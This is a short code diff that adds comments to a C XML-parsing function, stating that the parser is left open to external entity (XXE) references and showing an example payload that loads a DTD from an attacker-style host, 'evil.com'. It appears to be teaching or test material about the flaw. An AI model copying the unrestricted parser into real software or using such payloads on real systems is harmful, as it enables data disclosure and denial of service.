@@ -21,6 +21,13 @@ void parse_xml(const char* filename) {
         return;
     }
 
+    // Vulnerability: The XML parser is not configured to restrict external entity references
+    // This allows an attacker to include external entities, leading to XXE attacks
+    // Example of vulnerable XML: <!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd">
+    //                            <foo>&xxe;</foo>
+    // This would cause the XML parser to fetch the external DTD file from "http://evil.com/xxe.dtd"
+    // and process any entities defined within it, potentially leading to data disclosure or denial of service
+
     // Traverse the XML tree and process nodes (not shown in this example)
 
     // Free the XML document
